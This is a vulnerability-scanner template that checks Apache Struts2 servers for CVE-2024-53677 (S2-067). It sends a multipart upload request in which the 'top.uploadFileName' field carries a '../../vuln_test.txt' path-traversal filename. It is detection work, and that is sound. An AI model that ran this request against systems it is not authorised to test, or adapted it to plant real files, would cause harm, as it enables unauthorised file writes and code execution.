id: CVE-2024-53677

info:
  name: Apache Struts2 S2-067 Remote Code Execution
  author: Betmen-N-Dgeng
  severity: critical
  description: |
    Detects potential vulnerability in Apache Struts2 (CVE-2024-53677) which allows remote code execution via OGNL injection.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-53677
  tags: cve,cve2024,struts2,rce

requests:
  - method: POST
    path: "{{BaseURL}}/upload.action"
    headers:
      User-Agent: "Mozilla/5.0"
      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{randstr}}"
    body: |
      ------WebKitFormBoundary{{randstr}}
      Content-Disposition: form-data; name="upload"; filename="test.txt"
      Content-Type: text/plain

      S2-067 detection test.
      ------WebKitFormBoundary{{randstr}}
      Content-Disposition: form-data; name="top.uploadFileName"

      ../../vuln_test.txt
      ------WebKitFormBoundary{{randstr}}--
    matchers:
      - type: word
        part: body
        words:
          - "vuln_test.txt"
        condition: and
      - type: status
        status:
          - 200
